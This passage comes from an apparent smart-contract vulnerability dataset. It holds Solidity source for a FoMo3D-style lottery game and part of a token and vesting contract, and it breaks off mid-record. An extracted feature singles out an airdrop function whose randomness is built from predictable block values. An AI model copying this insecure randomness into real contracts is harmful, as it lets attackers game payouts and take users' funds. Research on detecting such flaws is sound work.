(plyrRnds_[_pID][_rID].keys == 0)\n _eventData_ = managePlayer(_pID, _eventData_);\n if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)\n {\n uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);\n uint256 _refund = _eth.sub(_availableLimit);\n plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);\n _eth = _availableLimit;\n }\n if (_eth > 1000000000)\n {\n uint256 _keys = (round_[_rID].eth).keysRec(_eth);\n if (_keys >= 1000000000000000000)\n {\n updateTimer(_keys, _rID, _eth);\n if (round_[_rID].plyr != _pID)\n round_[_rID].plyr = _pID;\n if (round_[_rID].team != _team)\n round_[_rID].team = _team;\n _eventData_.compressedData = _eventData_.compressedData + 100;\n }\n if (_eth >= 100000000000000000) {\n airDropTracker_++;\n if (airdrop() == true) {\n uint256 _prize;\n if (_eth >= 10000000000000000000)\n {\n _prize = ((airDropPot_).mul(75)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {\n _prize = ((airDropPot_).mul(50)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 200000000000000000000000000000000;\n } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {\n _prize = ((airDropPot_).mul(25)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n }\n _eventData_.compressedData += 10000000000000000000000000000000;\n _eventData_.compressedData += _prize * 1000000000000000000000000000000000;\n airDropTracker_ = 0;\n }\n }\n _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);\n plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);\n plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);\n round_[_rID].keys = _keys.add(round_[_rID].keys);\n round_[_rID].eth = _eth.add(round_[_rID].eth);\n rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);\n _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);\n _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);\n endTx(_pID, _team, _eth, _keys, _eventData_);\n }\n }\n function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)\n private\n view\n returns(uint256)\n {\n return( (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask) );\n }\n function calcKeysReceived(uint256 _rID, uint256 _eth)\n public\n view\n returns(uint256)\n {\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].eth).keysRec(_eth) );\n else\n return ( (_eth).keys() );\n }\n function iWantXKeys(uint256 _keys)\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );\n else\n return ( (_keys).eth() );\n }\n function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if (pIDxAddr_[_addr] != _pID)\n pIDxAddr_[_addr] = _pID;\n if (pIDxName_[_name] != _pID)\n pIDxName_[_name] = _pID;\n if (plyr_[_pID].addr != _addr)\n plyr_[_pID].addr = _addr;\n if (plyr_[_pID].name != _name)\n plyr_[_pID].name = _name;\n if (plyr_[_pID].laff != _laff)\n plyr_[_pID].laff = _laff;\n if (plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function receivePlayerNameList(uint256 _pID, bytes32 _name)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if(plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function determinePID(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_pID == 0)\n {\n _pID = PlayerBook.getPlayerID(msg.sender);\n bytes32 _name = PlayerBook.getPlayerName(_pID);\n uint256 _laff = PlayerBook.getPlayerLAff(_pID);\n pIDxAddr_[msg.sender] = _pID;\n plyr_[_pID].addr = msg.sender;\n if (_name != \"\")\n {\n pIDxName_[_name] = _pID;\n plyr_[_pID].name = _name;\n plyrNames_[_pID][_name] = true;\n }\n if (_laff != 0 && _laff != _pID)\n plyr_[_pID].laff = _laff;\n _eventData_.compressedData = _eventData_.compressedData + 1;\n }\n return (_eventData_);\n }\n function verifyTeam(uint256 _team)\n private\n pure\n returns (uint256)\n {\n if (_team < 0 || _team > 3)\n return(2);\n else\n return(_team);\n }\n function managePlayer(uint256 _pID, PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n if (plyr_[_pID].lrnd != 0)\n updateGenVault(_pID, plyr_[_pID].lrnd);\n plyr_[_pID].lrnd = rID_;\n _eventData_.compressedData = _eventData_.compressedData + 10;\n return(_eventData_);\n }\n function nextRound() private {\n rID_++;\n round_[rID_].strt = now;\n round_[rID_].end = now.add(rndInit_).add(rndGap_);\n }\n function endRound(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _rID = rID_;\n uint256 _winPID = round_[_rID].plyr;\n uint256 _winTID = round_[_rID].team;\n uint256 _pot = round_[_rID].pot;\n uint256 _win = (_pot.mul(48)) / 100;\n uint256 _com = (_pot / 50);\n uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;\n uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;\n uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);\n if (_dust > 0)\n {\n _gen = _gen.sub(_dust);\n _res = _res.add(_dust);\n }\n plyr_[_winPID].win = _win.add(plyr_[_winPID].win);\n if (!address(Pro_Inc).call.value(_com)(bytes4(keccak256(\"deposit()\"))))\n {\n _p3d = _p3d.add(_com);\n _com = 0;\n }\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n if (_p3d > 0)\n PCGod.deposit.value(_p3d)();\n _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);\n _eventData_.winnerAddr = plyr_[_winPID].addr;\n _eventData_.winnerName = plyr_[_winPID].name;\n _eventData_.amountWon = _win;\n _eventData_.genAmount = _gen;\n _eventData_.PCPAmount = _p3d;\n _eventData_.newPot = _res;\n _rID++;\n round_[_rID].ended = false;\n round_[_rID].strt = now;\n round_[_rID].end = now.add(rndInit_).add(rndGap_);\n round_[_rID].pot = _res;\n return(_eventData_);\n }\n function updateGenVault(uint256 _pID, uint256 _rIDlast)\n private\n {\n uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);\n if (_earnings > 0)\n {\n plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);\n plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);\n }\n }\n function updateTimer(uint256 _keys, uint256 _rID, uint256 _eth)\n private\n {\n uint256 _now = now;\n uint256 _newTime;\n if (_now > round_[_rID].end && round_[_rID].plyr == 0)\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);\n else\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);\n uint256 _newEndTime;\n if (_newTime < (rndMax_).add(_now))\n _newEndTime = _newTime;\n else\n _newEndTime = rndMax_.add(_now);\n if ( _eth >= rndReduceThreshold_ ) {\n _newEndTime = (_newEndTime).sub( (((_keys) / (1000000000000000000))).mul(rndInc_).add( (((_keys) / (2000000000000000000) ).mul(rndInc_)) ) );\n if( _newEndTime < _now + rndMin_ )\n _newEndTime = _now + rndMin_ ;\n }\n round_[_rID].end = _newEndTime;\n }\n function airdrop() private view returns(bool) {\n uint256 seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp).add\n (block.difficulty).add\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n (block.gaslimit).add\n ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n (block.number)\n )));\n if((seed - ((seed / 1000) * 1000)) < airDropTracker_)\n return(true);\n else\n return(false);\n }\n function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _com = _eth / 50;\n uint256 _p3d;\n if (!address(Pro_Inc).call.value(_com)(bytes4(keccak256(\"deposit()\"))))\n {\n _p3d = _com;\n _com = 0;\n }\n uint256 _long = _eth / 100;\n otherPCK_.potSwap.value(_long)();\n uint256 _aff = _eth / 10;\n if (_affID != _pID && plyr_[_affID].name != '') {\n plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);\n emit PCKevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);\n } else {\n _p3d = _aff;\n }\n _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));\n if (_p3d > 0)\n {\n PCGod.deposit.value(_p3d)();\n _eventData_.PCPAmount = _p3d.add(_eventData_.PCPAmount);\n }\n return(_eventData_);\n }\n function potSwap()\n external\n payable\n {\n uint256 _rID = rID_ + 1;\n round_[_rID].pot = round_[_rID].pot.add(msg.value);\n emit PCKevents.onPotSwapDeposit(_rID, msg.value);\n }\n function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;\n uint256 _air = (_eth / 100);\n airDropPot_ = airDropPot_.add(_air);\n _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));\n uint256 _pot = _eth.sub(_gen);\n uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);\n if (_dust > 0)\n _gen = _gen.sub(_dust);\n round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);\n _eventData_.genAmount = _gen.add(_eventData_.genAmount);\n _eventData_.potAmount = _pot;\n return(_eventData_);\n }\n function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)\n private\n returns(uint256)\n {\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);\n plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);\n return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));\n }\n function withdrawEarnings(uint256 _pID)\n private\n returns(uint256)\n {\n updateGenVault(_pID, plyr_[_pID].lrnd);\n uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);\n if (_earnings > 0)\n {\n plyr_[_pID].win = 0;\n plyr_[_pID].gen = 0;\n plyr_[_pID].aff = 0;\n }\n return(_earnings);\n }\n function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);\n emit PCKevents.onEndTx\n (\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n plyr_[_pID].name,\n msg.sender,\n _eth,\n _keys,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount,\n _eventData_.potAmount,\n airDropPot_\n );\n }\n bool public activated_ = false;\n function activate() public {\n require(\n msg.sender == admin,\n \"only team just can activate\"\n );\n require(address(otherPCK_) != address(0), \"must link to other PCK first\");\n require(activated_ == false, \"PCK already activated\");\n activated_ = true;\n rID_ = 1;\n round_[1].strt = now + rndExtra_ - rndGap_;\n round_[1].end = now + rndInit_ + rndExtra_;\n }\n function setOtherPCK(address _otherPCK) public {\n require(\n msg.sender == admin,\n \"only team just can activate\"\n );\n require(address(otherPCK_) == address(0), \"silly dev, you already did that\");\n otherPCK_ = otherPCK(_otherPCK);\n }\n}\nlibrary PCKdatasets {\n struct EventReturns {\n uint256 compressedData;\n uint256 compressedIDs;\n address winnerAddr;\n bytes32 winnerName;\n uint256 amountWon;\n uint256 newPot;\n uint256 PCPAmount;\n uint256 genAmount;\n uint256 potAmount;\n }\n struct Player {\n address addr;\n bytes32 name;\n uint256 win;\n uint256 gen;\n uint256 aff;\n uint256 lrnd;\n uint256 laff;\n }\n struct PlayerRounds {\n uint256 eth;\n uint256 keys;\n uint256 mask;\n uint256 ico;\n }\n struct Round {\n uint256 plyr;\n uint256 team;\n uint256 end;\n bool ended;\n uint256 strt;\n uint256 keys;\n uint256 eth;\n uint256 pot;\n uint256 mask;\n uint256 ico;\n uint256 icoGen;\n uint256 icoAvg;\n }\n struct TeamFee {\n uint256 gen;\n uint256 p3d;\n }\n struct PotSplit {\n uint256 gen;\n uint256 p3d;\n }\n}\nlibrary PCKKeysCalcLong {\n using SafeMath for *;\n function keysRec(uint256 _curEth, uint256 _newEth)\n internal\n pure\n returns (uint256)\n {\n return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));\n }\n function ethRec(uint256 _curKeys, uint256 _sellKeys)\n internal\n pure\n returns (uint256)\n {\n return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));\n }\n function keys(uint256 _eth)\n internal\n pure\n returns(uint256)\n {\n return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);\n }\n function eth(uint256 _keys)\n internal\n pure\n returns(uint256)\n {\n return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());\n }\n}\ninterface otherPCK {\n function potSwap() external payable;\n}\ninterface PCKExtSettingInterface {\n function getFastGap() external view returns(uint256);\n function getLongGap() external view returns(uint256);\n function getFastExtra() external view returns(uint256);\n function getLongExtra() external view returns(uint256);\n}\ninterface PlayCoinGodInterface {\n function deposit() external payable;\n}\ninterface ProForwarderInterface {\n function deposit() external payable returns(bool);\n function status() external view returns(address, address, bool);\n function startMigration(address _newCorpBank) external returns(bool);\n function cancelMigration() external returns(bool);\n function finishMigration() external returns(bool);\n function setup(address _firstCorpBank) external;\n}\ninterface PlayerBookInterface {\n function getPlayerID(address _addr) external returns (uint256);\n function getPlayerName(uint256 _pID) external view returns (bytes32);\n function getPlayerLAff(uint256 _pID) external view returns (uint256);\n function getPlayerAddr(uint256 _pID) external view returns (address);\n function getNameFee() external view returns (uint256);\n function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);\n}\nlibrary NameFilter {\n function nameFilter(string _input)\n internal\n pure\n returns(bytes32)\n {\n bytes memory _temp = bytes(_input);\n uint256 _length = _temp.length;\n require (_length <= 32 && _length > 0, \"string must be between 1 and 32 characters\");\n require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, \"string cannot start or end with space\");\n if (_temp[0] == 0x30)\n {\n require(_temp[1] != 0x78, \"string cannot start with 0x\");\n require(_temp[1] != 0x58, \"string cannot start with 0X\");\n }\n bool _hasNonNumber;\n for (uint256 i = 0; i < _length; i++)\n {\n if (_temp[i] > 0x40 && _temp[i] < 0x5b)\n {\n _temp[i] = byte(uint(_temp[i]) + 32);\n if (_hasNonNumber == false)\n _hasNonNumber = true;\n } else {\n require\n (\n _temp[i] == 0x20 ||\n (_temp[i] > 0x60 && _temp[i] < 0x7b) ||\n (_temp[i] > 0x2f && _temp[i] < 0x3a),\n \"string contains invalid characters\"\n );\n if (_temp[i] == 0x20)\n require( _temp[i+1] != 0x20, \"string cannot contain consecutive spaces\");\n if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))\n _hasNonNumber = true;\n }\n }\n require(_hasNonNumber == true, \"string cannot be only numbers\");\n bytes32 _ret;\n assembly {\n _ret := mload(add(_temp, 32))\n }\n return (_ret);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n require(c / a == b, \"SafeMath mul failed\");\n return c;\n }\n function sub(uint256 a, uint256 b)\n internal\n pure\n returns (uint256)\n {\n require(b <= a, \"SafeMath sub failed\");\n return a - b;\n }\n function add(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n c = a + b;\n require(c >= a, \"SafeMath add failed\");\n return c;\n }\n function sqrt(uint256 x)\n internal\n pure\n returns (uint256 y)\n {\n uint256 z = ((add(x,1)) / 2);\n y = x;\n while (z < y)\n {\n y = z;\n z = ((add((x / z),z)) / 2);\n }\n }\n function sq(uint256 x)\n internal\n pure\n returns (uint256)\n {\n return (mul(x,x));\n }\n function pwr(uint256 x, uint256 y)\n internal\n pure\n returns (uint256)\n {\n if (x==0)\n return (0);\n else if (y==0)\n return (1);\n else\n {\n uint256 z = x;\n for (uint256 i=1; i < y; i++)\n z = mul(z,x);\n return (z);\n }\n }\n}",
  "extract_feature": [
    "function airdrop() private view returns(bool) {\nuint256 seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp).add\n(block.difficulty).add\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n(block.gaslimit).add\n((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n(block.number)\n)));\nif((seed - ((seed / 1000) * 1000)) < airDropTracker_)\nreturn(true);\nelse\nreturn(false);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b75"
  },
  "filename": "3284.sol",
  "content": "pragma solidity 0.4.18;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary Math {\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract Presale {\n using SafeMath for uint256;\n uint256 private weiRaised;\n uint256 private startTime;\n uint256 private endTime;\n uint256 private rate;\n uint256 private cap;\n function Presale(uint256 _startTime, uint256 duration, uint256 _rate, uint256 _cap) public {\n require(_rate > 0);\n require(_cap > 0);\n require(_startTime >= now);\n require(duration > 0);\n rate = _rate;\n cap = _cap;\n startTime = _startTime;\n endTime = startTime + duration * 1 days;\n weiRaised = 0;\n }\n function totalWei() public constant returns(uint256) {\n return weiRaised;\n }\n function capRemaining() public constant returns(uint256) {\n return cap.sub(weiRaised);\n }\n function totalCap() public constant returns(uint256) {\n return cap;\n }\n function buyTokens(address purchaser, uint256 value) internal returns(uint256) {\n require(validPurchase(value));\n uint256 tokens = rate.mul(value);\n weiRaised = weiRaised.add(value);\n return tokens;\n }\n function hasEnded() internal constant returns(bool) {\n return now > endTime || weiRaised >= cap;\n }\n function hasStarted() internal constant returns(bool) {\n return now > startTime;\n }\n function validPurchase(uint256 value) internal view returns (bool) {\n bool withinCap = weiRaised.add(value) <= cap;\n return withinCap && withinPeriod();\n }\n function presaleRate() public view returns(uint256) {\n return rate;\n }\n function withinPeriod () private constant returns(bool) {\n return now >= startTime && now <= endTime;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract CanReclaimToken is Ownable {\n using SafeERC20 for ERC20Basic;\n function reclaimToken(ERC20Basic token) external onlyOwner {\n uint256 balance = token.balanceOf(this);\n token.safeTransfer(owner, balance);\n }\n}\ncontract VestingTrustee is Ownable, CanReclaimToken {\n using SafeMath for uint256;\n ERC20 public token;\n struct Grant {\n uint256 value;\n uint256 start;\n uint256 cliff;\n uint256 end;\n uint256 installmentLength;\n uint256 transferred;\n bool revokable;\n uint256 prevested;\n uint256 vestingPercentage;\n }\n mapping (address => Grant) public grants;\n uint256 public totalVesting;\n event NewGrant(address indexed _from, address indexed _to, uint256 _value);\n event TokensUnlocked(address indexed _to, uint256 _value);\n event GrantRevoked(address indexed _holder, uint256 _refund);\n function VestingTrustee(address _token) {\n require(_token != address(0));\n token = ERC20(_token);\n }\n function grant(address _to, uint256 _value, uint256 _start, uint256 _cliff, uint256 _end,\n uint256 _installmentLength, uint256 vestingPercentage, uint256 prevested, bool _revokable)\n external onlyOwner {\n require(_to != address(0));\n require(_to != address(this));\n require(_value > 0);\n require(_value.sub(prevested) > 0);\n require(vestingPercentage > 0);\n require(grants[_to].value == 0);\n require(_start <= _cliff && _cliff <= _end);\n require(_installmentLength > 0 && _installmentLength <= _end.sub(_start));\n require(totalVesting.add(_value.sub(prevested)) <= token.balanceOf(address(this)));\n grants[_to] = Grant({\n value: _value,\n start: _start,\n cliff: _cliff,\n end: _end,\n installmentLength: _installmentLength,\n transferred: prevested,\n revokable: _revokable,\n prevested: prevested,\n vestingPercentage: vestingPercentage\n });\n totalVesting = totalVesting.add(_value.sub(prevested));\n NewGrant(msg.sender, _to, _value);\n }\n function revoke(address _holder) public onlyOwner {\n Grant memory grant = grants[_holder];\n require(grant.revokable);\n uint256 refund = grant.value.sub(grant.transferred);\n delete grants[_holder];\n totalVesting = totalVesting.sub(refund);\n token.transfer(msg.sender, refund);\n GrantRevoked(_holder, refund);\n }\n function vestedTokens(address _holder, uint256 _time) external constant returns (uint256) {\n Grant memory grant = grants[_holder];\n if (grant.value == 0) {\n return 0;\n }\n return calculateVestedTokens(grant, _time);\n }\n function calculateVestedTokens(Grant _grant, uint256 _time) private constant returns (uint256) {\n if (_time < _grant.cliff) {\n return _grant.prevested;\n }\n if (_time >= _grant.end) {\n return _grant.value;\n }\n uint256 installmentsPast = _time.sub(_grant.cliff).div(_grant.installmentLength) + 1;\n return _grant.prevested.add(_grant.value.mul(installmentsPast.mul(_grant.vestingPercentage)).div(100));\n }\n function unlockVestedTokens() external {\n Grant storage grant = grants[msg.sender];\n require(grant.value != 0);\n uint256 vested = calculateVestedTokens(grant, now);\n if (vested == 0) {\n revert();\n }\n uint256 transferable = vested.sub(grant.transferred);\n if (transferable == 0) {\n revert();\n }\n grant.transferred = grant.transferred.add(transferable);\n totalVesting = totalVesting.sub(transferable);\n token.transfer(msg.sender, transferable);\n TokensUnlocked(msg.sender, transferable);\n }\n function reclaimEther() external onlyOwner {\n assert(owner.send(this.balance));\n }\n}\ncontract Controlled {\n modifier onlyController { require(msg.sender == controller); _; }\n address public controller;\n function Controlled() public { controller = msg.sender;}\n function changeController(address _newController) public onlyController {\n controller = _newController;\n }\n}\ncontract TokenController {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public\n returns(bool);\n}\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract MiniMeToken is Controlled {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'MMT_0.2';\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n MiniMeToken public parentToken;\n uint public parentSnapShotBlock;\n uint public creationBlock;\n mapping (address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint256)) allowed;\n Checkpoint[] totalSupplyHistory;\n bool public transfersEnabled;\n MiniMeTokenFactory public tokenFactory;\n function MiniMeToken(\n address _tokenFactory,\n address _parentToken,\n uint _parentSnapShotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public {\n tokenFactory = MiniMeTokenFactory(_tokenFactory);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n parentToken = MiniMeToken(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n transfersEnabled = _transfersEnabled;\n creationBlock = block.number;\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n doTransfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount\n ) public returns (bool success) {\n if (msg.sender != controller) {\n require(transfersEnabled);\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n }\n doTransfer(_from, _to, _amount);\n return true;\n }\n function doTransfer(address _from, address _to, uint _amount\n ) internal {\n if (_amount == 0) {\n Transfer(_from, _to, _amount);\n return;\n }\n require(parentSnapShotBlock < block.number);\n require((_to != 0) && (_to != address(this)));\n var previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom >= _amount);\n if (isContract(controller)) {\n require(TokenController(controller).onTransfer(_from, _to, _amount));\n }\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n var previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n Transfer(_from, _to, _amount);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n require((_amount == 0) || (allowed[msg.sender][_spender] == 0));\n if (isContract(controller)) {\n require(TokenController(controller).onApprove(msg.sender, _spender, _amount));\n }\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender\n ) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData\n ) public returns (bool success) {\n require(approve(_spender, _amount));\n ApproveAndCallFallBack(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function totalSupply() public constant returns (uint) {\n return totalSupplyAt(block.number);\n }\n function balanceOfAt(address _owner, uint _blockNumber) public constant\n returns (uint) {\n if ((balances[_owner].length == 0)\n || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function totalSupplyAt(uint _blockNumber) public constant returns(uint) {\n if ((totalSupplyHistory.length == 0)\n || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else 